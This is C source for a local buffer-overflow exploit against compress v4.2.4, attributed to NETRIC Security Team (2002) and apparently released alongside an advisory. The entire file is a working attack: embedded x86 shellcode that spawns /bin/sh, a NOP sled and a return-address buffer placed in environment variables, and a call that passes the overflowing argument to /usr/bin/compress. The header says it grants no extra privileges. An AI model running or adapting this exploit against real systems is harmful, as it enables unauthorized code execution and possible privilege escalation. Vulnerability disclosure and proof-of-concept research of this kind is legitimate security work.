/* Compress v4.2.4 local test exploit                           */
/*                                                              */
/* Yields no extra privileges. For more information please read */
/* our advisory.                                                */
/*                                                              */
/* (C) NETRIC SECURITY TEAM - 2002                              */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BSIZE 1032 // Replace for 1173 when using SuSE
#define EGGSIZE 2048

char *shellcode =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(int argc, char **argv) {
	char *buffer, *pointer, *egg;
	int bsize = BSIZE, c, offset = 0;
	long addr, *addr_pointer;
	int get_sp = (int)&get_sp;

	if (argc > 1) offset = atoi(argv[1]);
	if (argc > 2) bsize = atoi(argv[2]);

	if(!(buffer = malloc(bsize))) {
		fprintf(stderr, "Memory not allocated!\n");
		exit(1);
	}

	if(!(egg =  malloc(EGGSIZE))) {
		fprintf(stderr, "Memory not allocated!\n");
		exit(1);
	}


	addr = get_sp + offset;
	pointer = buffer;
	addr_pointer = (long *) pointer;
	
	printf("-> Compress 4.2.4 local exploit\n");
	printf("Using return adress: 0x%x\n", addr);
	printf("Buffersize: %d\n", bsize);
	printf("Offset: %d\n", offset);

	for(c = 0; c < bsize; c+=4)
	*(addr_pointer++) = addr;

	pointer = egg;
	
	for(c = 0; c < EGGSIZE - strlen(shellcode) -1; c++)
	*(pointer++) = NOP;

	for(c = 0; c < strlen(shellcode); c++)
	*(pointer++) = shellcode[c];

	egg[EGGSIZE -1] = '\0';
	buffer[bsize -1] = '\0';

	memcpy(buffer, "RET=", 4); putenv(buffer);
	memcpy(egg, "EGG=", 4); putenv(egg);

	system("/usr/bin/compress $RET");

	return 0;
}
